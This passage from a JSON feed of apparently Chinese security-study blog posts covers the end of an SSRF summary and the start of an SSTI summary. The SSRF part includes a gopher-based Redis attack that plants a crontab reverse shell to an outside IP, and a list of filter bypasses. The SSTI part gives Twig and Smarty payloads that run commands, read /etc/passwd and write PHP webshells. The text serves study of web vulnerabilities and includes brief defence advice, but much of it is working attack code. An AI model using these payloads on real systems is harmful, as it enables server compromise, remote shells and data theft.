class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># * 注意: 链接使用单引号，避免$变量问题</span></span><br><span class=\"line\"></span><br><span class=\"line\">curl -vvv <span class=\"string\">&#x27;gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$64%0d%0a%0d%0a%0a%0a*/1 * * * * bash -i &gt;&amp; /dev/tcp/103.21.140.84/6789 0&gt;&amp;1%0a%0a%0a%0a%0a%0d%0a%0d%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a/var/spool/cron/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0aquit%0d%0a&#x27;</span></span><br></pre></td></tr></table></figure>\n<h2 id=\"可能的利用点\"><a class=\"anchor\" href=\"#可能的利用点\">#</a> 可能的利用点</h2>\n<h3 id=\"内网服务\"><a class=\"anchor\" href=\"#内网服务\">#</a> 内网服务</h3>\n<ul>\n<li>Apache Hadoop 远程命令执行</li>\n<li>axis2-admin 部署 Server 命令执行</li>\n<li>Confluence SSRF</li>\n<li>counchdb WEB API 远程命令执行</li>\n<li>dict</li>\n<li>docker API 远程命令执行</li>\n<li>Elasticsearch 引擎 Groovy 脚本命令执行</li>\n<li>ftp /ftps（FTP 爆破）</li>\n<li>glassfish 任意文件读取和 war 文件部署间接命令执行</li>\n<li>gopher</li>\n<li>HFS 远程命令执行</li>\n<li>http、https</li>\n<li>imap/imaps/pop3/pop3s/smtp/smtps（爆破邮件用户名密码）</li>\n<li>Java 调试接口命令执行</li>\n<li>JBOSS 远程 Invoker war 命令执行</li>\n<li>Jenkins Scripts 接口命令执行</li>\n<li>ldap</li>\n<li>mongodb</li>\n<li>php_fpm/fastcgi 命令执行</li>\n<li>rtsp - smb/smbs（连接 SMB）</li>\n<li>sftp</li>\n<li>ShellShock 命令执行</li>\n<li>Struts2 命令执行</li>\n<li>telnet</li>\n<li>tftp（UDP 协议扩展）</li>\n<li>tomcat 命令执行</li>\n<li>WebDav PUT 上传任意文件</li>\n<li>WebSphere Admin 可部署 war 间接命令执行</li>\n<li>zentoPMS 远程命令执行</li>\n</ul>\n<h3 id=\"redis利用\"><a class=\"anchor\" href=\"#redis利用\">#</a> Redis 利用</h3>\n<ul>\n<li>写 ssh 公钥</li>\n<li>写 crontab</li>\n<li>写 WebShell</li>\n<li>Windows 写启动项</li>\n<li>主从复制加载 .so 文件</li>\n<li>主从复制写无损文件</li>\n</ul>\n<h3 id=\"云主机\"><a class=\"anchor\" href=\"#云主机\">#</a> 云主机</h3>\n<p>在 AWS、Google 等云环境下，通过访问云环境的元数据 API 或管理 API，在部分情况下可以实现敏感信息等效果。</p>\n<h1 id=\"ssrf的防范\"><a class=\"anchor\" href=\"#ssrf的防范\">#</a> SSRF 的防范</h1>\n<ul>\n<li>过滤返回的信息</li>\n<li>统一错误信息</li>\n<li>限制请求的端口只能为 Web 端口，只允许访问 HTTP 和 HTTPS 的请求</li>\n<li>禁止不常用的协议</li>\n<li>对 DNS Rebinding，考虑使用 DNS 缓存或者 Host 白名单</li>\n</ul>\n<h1 id=\"ssrf的过滤绕过\"><a class=\"anchor\" href=\"#ssrf的过滤绕过\">#</a> SSRF 的过滤绕过</h1>\n<p>以攻击 127.0.0.1:80 端口为例</p>\n<h3 id=\"1-利用localhost\"><a class=\"anchor\" href=\"#1-利用localhost\">#</a> 1、利用 localhost</h3>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http://localhost:22</span><br></pre></td></tr></table></figure>\n<h3 id=\"2-利用\"><a class=\"anchor\" href=\"#2-利用\">#</a> 2、利用 [::]</h3>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">利用[::]绕过localhost</span><br><span class=\"line\">http://[::]:80/  &gt;&gt;&gt;  http://127.0.0.1</span><br></pre></td></tr></table></figure>\n<h3 id=\"3-利用\"><a class=\"anchor\" href=\"#3-利用\">#</a> 3、利用 @</h3>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http://example.com@127.0.0.1</span><br></pre></td></tr></table></figure>\n<h3 id=\"4-利用短地址\"><a class=\"anchor\" href=\"#4-利用短地址\">#</a> 4、利用短地址</h3>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http://dwz.cn/11SMa  &gt;&gt;&gt;  http://127.0.0.1</span><br></pre></td></tr></table></figure>\n<h3 id=\"5-利用特殊域名\"><a class=\"anchor\" href=\"#5-利用特殊域名\">#</a> 5、利用特殊域名</h3>\n<p>利用的原理是 DNS 解析</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http://127.0.0.1.xip.io/</span><br><span class=\"line\">http://www.owasp.org.127.0.0.1.xip.io/</span><br></pre></td></tr></table></figure>\n<h3 id=\"6-利用dns解析\"><a class=\"anchor\" href=\"#6-利用dns解析\">#</a> 6、利用 DNS 解析</h3>\n<p>在域名上设置 A 记录，指向 127.0.1</p>\n<h3 id=\"7-利用上传\"><a class=\"anchor\" href=\"#7-利用上传\">#</a> 7、利用上传</h3>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">修改&quot;type=file&quot;为&quot;type=url&quot;</span><br><span class=\"line\">比如：</span><br><span class=\"line\">上传图片处修改上传，将图片文件修改为URL，即可能触发SSRF</span><br></pre></td></tr></table></figure>\n<h3 id=\"8-利用enclosed-alphanumerics\"><a class=\"anchor\" href=\"#8-利用enclosed-alphanumerics\">#</a> 8、利用 Enclosed alphanumerics</h3>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">利用Enclosed alphanumerics</span><br><span class=\"line\">ⓔⓧⓐⓜⓟⓛⓔ.ⓒⓞⓜ  &gt;&gt;&gt;  example.com</span><br><span class=\"line\">List:</span><br><span class=\"line\">① ② ③ ④ ⑤ ⑥ ⑦ ⑧ ⑨ ⑩ ⑪ ⑫ ⑬ ⑭ ⑮ ⑯ ⑰ ⑱ ⑲ ⑳ </span><br><span class=\"line\">⑴ ⑵ ⑶ ⑷ ⑸ ⑹ ⑺ ⑻ ⑼ ⑽ ⑾ ⑿ ⒀ ⒁ ⒂ ⒃ ⒄ ⒅ ⒆ ⒇ </span><br><span class=\"line\">⒈ ⒉ ⒊ ⒋ ⒌ ⒍ ⒎ ⒏ ⒐ ⒑ ⒒ ⒓ ⒔ ⒕ ⒖ ⒗ ⒘ ⒙ ⒚ ⒛ </span><br><span class=\"line\">⒜ ⒝ ⒞ ⒟ ⒠ ⒡ ⒢ ⒣ ⒤ ⒥ ⒦ ⒧ ⒨ ⒩ ⒪ ⒫ ⒬ ⒭ ⒮ ⒯ ⒰ ⒱ ⒲ ⒳ ⒴ ⒵ </span><br><span class=\"line\">Ⓐ Ⓑ Ⓒ Ⓓ Ⓔ Ⓕ Ⓖ Ⓗ Ⓘ Ⓙ Ⓚ Ⓛ Ⓜ Ⓝ Ⓞ Ⓟ Ⓠ Ⓡ Ⓢ Ⓣ Ⓤ Ⓥ Ⓦ Ⓧ Ⓨ Ⓩ </span><br><span class=\"line\">ⓐ ⓑ ⓒ ⓓ ⓔ ⓕ ⓖ ⓗ ⓘ ⓙ ⓚ ⓛ ⓜ ⓝ ⓞ ⓟ ⓠ ⓡ ⓢ ⓣ ⓤ ⓥ ⓦ ⓧ ⓨ ⓩ </span><br><span class=\"line\">⓪ ⓫ ⓬ ⓭ ⓮ ⓯ ⓰ ⓱ ⓲ ⓳ ⓴ </span><br><span class=\"line\">⓵ ⓶ ⓷ ⓸ ⓹ ⓺ ⓻ ⓼ ⓽ ⓾ ⓿</span><br></pre></td></tr></table></figure>\n<h3 id=\"9-利用句号\"><a class=\"anchor\" href=\"#9-利用句号\">#</a> 9、利用句号</h3>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">127。0。0。1  &gt;&gt;&gt;  127.0.0.1</span><br></pre></td></tr></table></figure>\n<h3 id=\"10-利用进制转换\"><a class=\"anchor\" href=\"#10-利用进制转换\">#</a> 10、利用进制转换</h3>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">可以是十六进制，八进制等。</span><br><span class=\"line\">115.239.210.26  &gt;&gt;&gt;  16373751032</span><br><span class=\"line\">首先把这四段数字给分别转成16进制，结果：73 ef d2 1a</span><br><span class=\"line\">然后把 73efd21a 这十六进制一起转换成8进制</span><br><span class=\"line\">记得访问的时候加0表示使用八进制(可以是一个0也可以是多个0 跟XSS中多加几个0来绕过过滤一样)，十六进制加0x</span><br><span class=\"line\">http://127.0.0.1  &gt;&gt;&gt;  http://0177.0.0.1/</span><br><span class=\"line\">http://127.0.0.1  &gt;&gt;&gt;  http://2130706433/</span><br></pre></td></tr></table></figure>\n<h3 id=\"11-利用特殊地址\"><a class=\"anchor\" href=\"#11-利用特殊地址\">#</a> 11、利用特殊地址</h3>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http://0/</span><br></pre></td></tr></table></figure>\n<h3 id=\"12-利用协议\"><a class=\"anchor\" href=\"#12-利用协议\">#</a> 12、利用协议</h3>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Dict://</span><br><span class=\"line\">dict://&lt;user-auth&gt;@&lt;host&gt;:&lt;port&gt;/d:&lt;word&gt;</span><br><span class=\"line\">ssrf.php?url=dict://attacker:11111/</span><br><span class=\"line\">SFTP://</span><br><span class=\"line\">ssrf.php?url=sftp://example.com:11111/</span><br><span class=\"line\">TFTP://</span><br><span class=\"line\">ssrf.php?url=tftp://example.com:12346/TESTUDPPACKET</span><br><span class=\"line\">LDAP://</span><br><span class=\"line\">ssrf.php?url=ldap://localhost:11211/%0astats%0aquit</span><br><span class=\"line\">Gopher://</span><br><span class=\"line\">ssrf.php?url=gopher://127.0.0.1:25/xHELO%20localhost%250d%250aMAIL%20FROM%3A%3Chacker@site.com%3E%250d%250aRCPT%20TO%3A%3Cvictim@site.com%3E%250d%250aDATA%250d%250aFrom%3A%20%5BHacker%5D%20%3Chacker@site.com%3E%250d%250aTo%3A%20%3Cvictime@site.com%3E%250d%250aDate%3A%20Tue%2C%2015%20Sep%202017%2017%3A20%3A26%20-0400%250d%250aSubject%3A%20AH%20AH%20AH%250d%250a%250d%250aYou%20didn%27t%20say%20the%20magic%20word%20%21%250d%250a%250d%250a%250d%250a.%250d%250aQUIT%250d%250a</span><br></pre></td></tr></table></figure>\n<h3 id=\"13-dns-rebinding\"><a class=\"anchor\" href=\"#13-dns-rebinding\">#</a> 13、DNS Rebinding</h3>\n<p>一个常用的防护思路是：对于用户请求的 URL 参数，首先服务器端会对其进行 DNS 解析，然后对于 DNS 服务器返回的 IP 地址进行判断，如果在黑名单中，就禁止该次请求。</p>\n<p>但是在整个过程中，第一次去请求 DNS 服务进行域名解析到第二次服务端去请求 URL 之间存在一个时间差，利用这个时间差，可以进行 DNS 重绑定攻击。</p>\n<p>要完成 DNS 重绑定攻击，我们需要一个域名，并且将这个域名的解析指定到我们自己的 DNS Server，在我们的可控的 DNS Server 上编写解析服务，设置 TTL 时间为 0。这样就可以进行攻击了，完整的攻击流程为：</p>\n<ul>\n<li>服务器端获得 URL 参数，进行第一次 DNS 解析，获得了一个非内网的 IP</li>\n<li>对于获得的 IP 进行判断，发现为非黑名单 IP，则通过验证</li>\n<li>服务器端对于 URL 进行访问，由于 DNS 服务器设置的 TTL 为 0，所以再次进行 DNS 解析，这一次 DNS 服务器返回的是内网地址。</li>\n<li>由于已经绕过验证，所以服务器端返回访问内网资源的结果。</li>\n</ul>\n<h3 id=\"14-利用ipv6\"><a class=\"anchor\" href=\"#14-利用ipv6\">#</a> 14、利用 IPv6</h3>\n<p>有些服务没有考虑 IPv6 的情况，但是内网又支持 IPv6，则可以使用 IPv6 的本地 IP 如  <code>[::]</code>   <code>0000::1</code>  或 IPv6 的内网域名来绕过过滤。</p>\n<h1 id=\"ctf中的ssrf\"><a class=\"anchor\" href=\"#ctf中的ssrf\">#</a> CTF 中的 SSRF</h1>\n<p>待做</p>\n<h1 id=\"参考链接\"><a class=\"anchor\" href=\"#参考链接\">#</a> 参考链接</h1>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93ZWJzZWMucmVhZHRoZWRvY3MuaW8vemgvbGF0ZXN0L3Z1bG4vc3NyZi5odG1s\"> Web 安全学习笔记</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2xhZHlfa2lsbGVyOS9hcnRpY2xlL2RldGFpbHMvMTA4MjY3MTM0\">网络安全 - SSRF 漏洞原理、攻击与防御</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuc2VjcHVsc2UuY29tL2FyY2hpdmVzLzY1ODMyLmh0bWw=\">SSRF 绕过方法总结</span></p>\n",
            "tags": []
        },
        {
            "id": "http://example.com/2024/03/03/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/",
            "url": "http://example.com/2024/03/03/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/",
            "title": "SSTI模板注入漏洞总结",
            "date_published": "2024-03-03T13:19:03.000Z",
            "content_html": "<h1 id=\"认识ssti\"><a class=\"anchor\" href=\"#认识ssti\">#</a> 认识 SSTI</h1>\n<p>SSTI 即服务器端模板注入（Server-Side Template Injection）</p>\n<h2 id=\"漏洞成因\"><a class=\"anchor\" href=\"#漏洞成因\">#</a> 漏洞成因</h2>\n<p>服务端接收了用户的恶意输入以后，未经任何处理就将其作为 Web 应用模板内容的一部分，模板引擎在进行目标编译渲染的过程中，执行了用户插入的可以破坏模板的语句，因而可能导致了敏感信息泄露、代码执行、GetShell 等问题。</p>\n<p>简单来说就是服务端接受用户的输入并解析执行，当用户输入一些恶意指令时，攻击就产生了。(有 SQL 注入、XSS 那味了)</p>\n<h2 id=\"如何判断是否存在ssti\"><a class=\"anchor\" href=\"#如何判断是否存在ssti\">#</a> 如何判断是否存在 SSTI</h2>\n<p>1、通过页面渲染返回的内容检测承载的 Payload 是否有得到编译解析，有解析则可以判定含有 Payload 对应模板引擎注入，否则不存在 SSTI。</p>\n<p>比如传入 sxq {{1+1}} sxq，若返回 sxq2sxq，则存在 SSTI</p>\n<p>2、查看网页源码，如果看到存在如下之类的字符，说明使用了模板引擎</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">div</span>&gt;</span>&#123;$what&#125;<span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">p</span>&gt;</span>Welcome, &#123;&#123;username&#125;&#125;<span class=\"tag\">&lt;/<span class=\"name\">p</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">div</span>&gt;</span>&#123;%$a%&#125;<span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\">...</span><br></pre></td></tr></table></figure>\n<p>3、从源码中看到 template ()、render () 等函数</p>\n<h1 id=\"各种模板引擎介绍与ssti利用\"><a class=\"anchor\" href=\"#各种模板引擎介绍与ssti利用\">#</a> 各种模板引擎介绍与 SSTI 利用</h1>\n<h2 id=\"php\"><a class=\"anchor\" href=\"#php\">#</a> PHP</h2>\n<p>常见模板有 Twig，smarty，blade</p>\n<h3 id=\"twig2x版本\"><a class=\"anchor\" href=\"#twig2x版本\">#</a> Twig (2.x 版本)</h3>\n<h4 id=\"介绍\"><a class=\"anchor\" href=\"#介绍\">#</a> 介绍</h4>\n<p>Twig 由 Symfony 框架提供</p>\n<p>简单用例</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\">　　<span class=\"keyword\">require_once</span> <span class=\"title function_ invoke__\">dirname</span>(<span class=\"keyword\">__FILE__</span>).<span class=\"string\">&#x27;\\twig\\lib\\Twig\\Autoloader.php&#x27;</span>;</span><br><span class=\"line\">　　<span class=\"title class_\">Twig_Autoloader</span>::<span class=\"title function_ invoke__\">register</span>(<span class=\"literal\">true</span>);</span><br><span class=\"line\">　　<span class=\"variable\">$twig</span> = <span class=\"keyword\">new</span> <span class=\"title class_\">Twig_Environment</span>(<span class=\"keyword\">new</span> <span class=\"title class_\">Twig_Loader_String</span>());</span><br><span class=\"line\">　　<span class=\"variable\">$output</span> = <span class=\"variable\">$twig</span>-&gt;<span class=\"title function_ invoke__\">render</span>(<span class=\"string\">&quot;Hello &#123;&#123;name&#125;&#125;&quot;</span>, <span class=\"keyword\">array</span>(<span class=\"string\">&quot;name&quot;</span> =&gt; <span class=\"variable\">$_GET</span>[<span class=\"string\">&quot;name&quot;</span>]));  <span class=\"comment\">// 将用户输入作为模版变量的值</span></span><br><span class=\"line\">　　<span class=\"keyword\">echo</span> <span class=\"variable\">$output</span>;</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n<p>render () 方法，其第一个参数载入模板，并通过第二个参数中的变量来渲染模板</p>\n<p>需要注意的一点是，模版引擎一般都默认对渲染的变量值进行编码和转义，所以此处并不会造成 XSS</p>\n<p>但是，如果渲染的模版内容受到用户的控制，如下</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\">　　<span class=\"keyword\">require_once</span> <span class=\"title function_ invoke__\">dirname</span>(<span class=\"keyword\">__FILE__</span>).<span class=\"string\">&#x27;/../lib/Twig/Autoloader.php&#x27;</span>;</span><br><span class=\"line\">　　<span class=\"title class_\">Twig_Autoloader</span>::<span class=\"title function_ invoke__\">register</span>(<span class=\"literal\">true</span>);</span><br><span class=\"line\">　　<span class=\"variable\">$twig</span>=<span class=\"title function_ invoke__\">newTwig_Environment</span>(<span class=\"title function_ invoke__\">newTwig_Loader_String</span>());</span><br><span class=\"line\">　　<span class=\"variable\">$output</span>=<span class=\"variable\">$twig</span>-&gt;<span class=\"title function_ invoke__\">render</span>(<span class=\"string\">&quot;Hello <span class=\"subst\">&#123;$_GET[&#x27;name&#x27;]&#125;</span>&quot;</span>);<span class=\"comment\">// 将用户输入作为模版内容的一部分</span></span><br><span class=\"line\">　　<span class=\"keyword\">echo</span> <span class=\"variable\">$output</span>;<span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n<p>则会发生 XSS 攻击</p>\n<h4 id=\"针对twig的payload\"><a class=\"anchor\" href=\"#针对twig的payload\">#</a> 针对 Twig 的 payload</h4>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;&#123;_self.env.<span class=\"title function_ invoke__\">registerUndefinedFilterCallback</span>(<span class=\"string\">&quot;exec&quot;</span>)&#125;&#125;&#123;&#123;_self.env.<span class=\"title function_ invoke__\">getFilter</span>(<span class=\"string\">&quot;id&quot;</span>)&#125;&#125;</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;&#123;<span class=\"string\">&#x27;/etc/passwd&#x27;</span>|<span class=\"title function_ invoke__\">file_excerpt</span>(<span class=\"number\">1</span>,<span class=\"number\">30</span>)&#125;&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">&#123;&#123;app.request.files.<span class=\"title function_ invoke__\">get</span>(<span class=\"number\">1</span>).<span class=\"title function_ invoke__\">__construct</span>(<span class=\"string\">&#x27;/etc/passwd&#x27;</span>,<span class=\"string\">&#x27;&#x27;</span>)&#125;&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">&#123;&#123;app.request.files.<span class=\"title function_ invoke__\">get</span>(<span class=\"number\">1</span>).openFile.<span class=\"title function_ invoke__\">fread</span>(<span class=\"number\">99</span>)&#125;&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">&#123;&#123;_self.env.<span class=\"title function_ invoke__\">registerUndefinedFilterCallback</span>(<span class=\"string\">&quot;exec&quot;</span>)&#125;&#125;&#123;&#123;_self.env.<span class=\"title function_ invoke__\">getFilter</span>(<span class=\"string\">&quot;whoami&quot;</span>)&#125;&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">&#123;&#123;_self.env.<span class=\"title function_ invoke__\">enableDebug</span>()&#125;&#125;&#123;&#123;_self.env.<span class=\"title function_ invoke__\">isDebug</span>()&#125;&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">&#123;&#123;[<span class=\"string\">&quot;id&quot;</span>]|<span class=\"title function_ invoke__\">map</span>(<span class=\"string\">&quot;system&quot;</span>)|<span class=\"title function_ invoke__\">join</span>(<span class=\"string\">&quot;,&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">&#123;&#123;&#123;<span class=\"string\">&quot;&lt;?php phpinfo();&quot;</span>:<span class=\"string\">&quot;/var/www/html/shell.php&quot;</span>&#125;|<span class=\"title function_ invoke__\">map</span>(<span class=\"string\">&quot;file_put_contents&quot;</span>)&#125;&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">&#123;&#123;[<span class=\"string\">&quot;id&quot;</span>,<span class=\"number\">0</span>]|<span class=\"title function_ invoke__\">sort</span>(<span class=\"string\">&quot;system&quot;</span>)|<span class=\"title function_ invoke__\">join</span>(<span class=\"string\">&quot;,&quot;</span>)&#125;&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">&#123;&#123;[<span class=\"string\">&quot;id&quot;</span>]|<span class=\"title function_ invoke__\">filter</span>(<span class=\"string\">&quot;system&quot;</span>)|<span class=\"title function_ invoke__\">join</span>(<span class=\"string\">&quot;,&quot;</span>)&#125;&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">&#123;&#123;[<span class=\"number\">0</span>,<span class=\"number\">0</span>]|<span class=\"title function_ invoke__\">reduce</span>(<span class=\"string\">&quot;system&quot;</span>,<span class=\"string\">&quot;id&quot;</span>)|<span class=\"title function_ invoke__\">join</span>(<span class=\"string\">&quot;,&quot;</span>)&#125;&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">&#123;&#123;[<span class=\"string\">&#x27;cat /etc/passwd&#x27;</span>]|<span class=\"title function_ invoke__\">filter</span>(<span class=\"string\">&#x27;system&#x27;</span>)&#125;&#125;</span><br></pre></td></tr></table></figure>\n<p>扩展阅读：<span class=\"exturl\" data-url=\"aHR0cHM6Ly94ei5hbGl5dW4uY29tL3QvNzUxOCN0b2MtNQ==\">TWIG 全版本通用 SSTI payloads</span></p>\n<h3 id=\"smarty\"><a class=\"anchor\" href=\"#smarty\">#</a> Smarty</h3>\n<p>Smarty 是最流行的 PHP 模板语言之一，其强制执行在 php 安全函数白名单中的函数，因此我们在模板中无法直接调用 php 中直接执行命令的函数，但是 smarty 内置变量可用于访问各种环境变量，比如我们使用 self 得到 smarty 这个类以后我们就去找 smarty 给我们的的方法</p>\n<h4 id=\"针对smarty的payload\"><a class=\"anchor\" href=\"#针对smarty的payload\">#</a> 针对 Smarty 的 payload</h4>\n<p>读文件</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;<span class=\"built_in\">self</span>::<span class=\"title function_ invoke__\">getStreamVariable</span>(<span class=\"string\">&quot;file:///etc/passwd&quot;</span>)&#125; </span><br></pre></td></tr></table></figure>\n<p>getStreamVariable () 这个方法可以获取传入变量的流，其源码在 smarty/libs/sysplugins/smarty_internal_data.php 可以看到</p>\n<p>获取 webshell</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,&quot;&lt;?php eval($_GET[&#x27;cmd&#x27;]); ?&gt;&quot;,self::clearConfig())&#125;</span><br></pre></td></tr></table></figure>\n<p>Smarty_Internal_Write_File 这个类中有一个 writeFile 方法，源码在 smarty/libs/sysplugins/smarty_internal_write_file.php</p>\n<p>其他一些利用方式</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;<span class=\"variable\">$smarty</span>.version&#125;  <span class=\"comment\">#获取smarty的版本号</span></span><br><span class=\"line\">&#123;php&#125;<span class=\"title function_ invoke__\">phpinfo</span>();&#123;/php&#125;  <span class=\"comment\">#执行相应的php代码(已在Smarty3版本中废弃&#123;php&#125;标签)</span></span><br><span class=\"line\">&lt;script language=<span class=\"string\">&quot;php&quot;</span>&gt;<span class=\"title function_ invoke__\">phpinfo</span>();&lt;/script&gt;   </span><br><span class=\"line\">&#123;<span class=\"keyword\">if</span> <span class=\"title function_ invoke__\">phpinfo</span>()&#125;&#123;/<span class=\"keyword\">if</span>&#125;</span><br></pre></td></tr></table></figure>\n<h3 id=\"blade\"><a class=\"anchor\" href=\"#blade\">#</a> Blade</h3>\n<p>Blade 是 Laravel 提供的一个既简单又强大的模板引擎。</p>\n<p>以后再写</p>\n<p>参考文章：<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vc2dtNDIzMS9wLzEwMjgzNjYxLmh0bWw=\">laravel Blade 模板引擎</span></p>\n<h2 id=\"python\"><a class=\"anchor\" href=\"#python\">#</a> Python</h2>\n<p>常见模板有 Jinja2，tornado</p>\n<h3 id=\"jinja2\"><a class=\"anchor\" href=\"#jinja2\">#</a> Jinja2</h3>\n<p>Jinja2 是一种面向 Python 的现代和设计友好的模板语言，它是以 Django 的模板为模型的，是 Flask 框架的一部分</p>\n<h4 id=\"语法\"><a class=\"anchor\" href=\"#语法\">#</a> 语法</h4>\n<p>{{}}：执行</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;&#123;<span class=\"number\">98</span>-<span class=\"number\">2</span>&#125;&#125; <span class=\"comment\"># 96</span></span><br></pre></td></tr></table></figure>\n<p>{{%%}}：声明变量、条件语句、循环语句</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span 